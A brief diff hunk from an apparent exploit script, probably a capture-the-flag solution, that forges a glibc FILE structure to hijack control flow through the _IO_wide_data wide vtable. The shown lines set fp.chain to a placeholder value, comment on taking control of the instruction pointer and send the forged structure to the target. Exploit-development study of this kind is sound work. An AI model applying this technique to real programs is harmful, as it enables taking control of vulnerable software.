@@ -127,7 +127,7 @@ mov    rax, qword ptr [rax + 0xe0]   // move rax = _IO_wide_data->_wide_vtable
 call   qword ptr [rax + 0x68]      // calling  _IO_wide_data->_wide_vtable + 0x68
 
 """
-fp.chain = 0xdeadc0de
+fp.chain = 0xdeadc0de # controll the rip pointer
 
 io.sendline(bytes(fp))
 
